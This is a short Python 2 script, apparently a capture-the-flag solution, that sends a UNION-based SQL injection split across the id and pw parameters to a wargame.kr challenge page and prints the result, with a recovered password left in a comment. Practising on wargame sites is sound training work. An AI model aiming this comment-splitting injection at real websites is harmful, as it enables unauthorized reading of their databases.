# -*- coding: utf8 -*-

import urllib, urllib2, time

headers = {'Host': 'wargame.kr:8080'}

data = "?id="
data = data + urllib.quote("' union select 1,xvvcPw4coaa1sslfe,3,4,5 /*")
data = data + "&pw="
data = data + urllib.quote("*/ from findflag_2 #")

req = urllib2.Request("http://wargame.kr:8080/zairo/" + data, '', headers)
response = urllib2.urlopen(req)

res = response.read()
print len(res), res

# pw : wkdlfhpw!!@%%#@@#